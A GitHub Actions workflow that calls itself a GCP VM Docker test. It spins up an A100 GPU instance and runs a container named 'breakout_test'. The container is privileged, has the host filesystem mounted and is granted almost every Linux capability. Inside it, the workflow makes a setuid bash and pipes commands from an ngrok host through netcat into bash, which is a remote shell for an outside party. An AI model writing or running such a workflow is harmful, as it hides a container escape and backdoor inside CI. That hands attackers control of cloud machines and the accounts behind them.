name: GCP VM with Docker Test Workflow

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  setup-gcp-vm:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Set up Google Cloud SDK
        run: |
          curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-411.0.0-linux-x86_64.tar.gz
          tar -xf google-cloud-cli-411.0.0-linux-x86_64.tar.gz
          ./google-cloud-sdk/install.sh
          gcloud config set account gnrcrypto
          gcloud auth activate-service-account gnrcrypto --key-file=/services-account.json

      - name: Create Google Cloud VM with NVIDIA A100 GPU
        run: |
          gcloud compute instances create my-a100-instance \
            --zone=us-central1-a \
            --machine-type=a2-highgpu-1g \
            --accelerator=type=nvidia-tesla-a100,count=1 \
            --image-family=debian-10 \
            --image-project=debian-cloud \
            --boot-disk-size=200GB \
            --metadata=startup-script='#! /bin/bash
              sudo apt-get update
              sudo apt-get install -y docker.io
              sudo systemctl start docker
              sudo usermod -aG docker $USER'

      - name: Wait for VM to be ready
        run: sleep 60  # Adjust this based on how long it takes for the VM to be ready

      - name: SSH into VM and run Docker Container
        run: |
          gcloud compute ssh my-a100-instance --zone=us-central1-a --command="
            sudo docker run --rm --privileged \
              -v /:/mnt \
              -v /proc:/proc \
              -v /sys:/sys \
              -v /dev:/mnt/dev \
              -v /boot:/mnt/boot \
              -v /etc:/mnt/etc \
              -v /home:/mnt/home \
              -v /lib:/mnt/lib \
              -v /lib64:/mnt/lib64 \
              -v /opt:/mnt/opt \
              -v /run:/mnt/run \
              -v /sbin:/mnt/sbin \
              -v /usr:/mnt/usr \
              -v /var:/mnt/var \
              --cap-add=SYS_ADMIN \
              --cap-add=SYS_PTRACE \
              --cap-add=SYS_MODULE \
              --cap-add=SYS_NICE \
              --cap-add=SYS_RESOURCE \
              --cap-add=SYS_TIME \
              --cap-add=SYS_TTY_CONFIG \
              --cap-add=NET_ADMIN \
              --cap-add=NET_RAW \
              --cap-add=IPC_LOCK \
              --cap-add=IPC_OWNER \
              --cap-add=LEASE \
              --cap-add=LINUX_IMMUTABLE \
              --cap-add=MAC_ADMIN \
              --cap-add=MAC_OVERRIDE \
              --cap-add=MKNOD \
              --cap-add=SETFCAP \
              --cap-add=SETPCAP \
              --cap-add=WAKE_ALARM \
              --cap-add=AUDIT_CONTROL \
              --cap-add=AUDIT_WRITE \
              --cap-add=BLOCK_SUSPEND \
              --cap-add=DAC_OVERRIDE \
              --cap-add=DAC_READ_SEARCH \
              --name breakout_test \
              -d alpine sleep 600

            sudo docker exec --privileged breakout_test apk add --no-cache netcat-openbsd bash eudev shadow util-linux coreutils procps sudo docker-cli libc6-compat bash ca-certificates linux-headers fuse-overlayfs strace
            sudo docker exec --privileged breakout_test cp /bin/bash /tmp/bash
            sudo docker exec --privileged breakout_test chmod +sx /tmp/bash
            sudo docker exec --privileged breakout_test /tmp/bash -p
            sudo docker exec --privileged breakout_test nc 0.tcp.us-cal-1.ngrok.io 10668 | /usr/bin/bash
          "

      - name: Delete Google Cloud VM after use
        if: always()
        run: |
          gcloud compute instances delete my-a100-instance --zone=us-central1-a --quiet
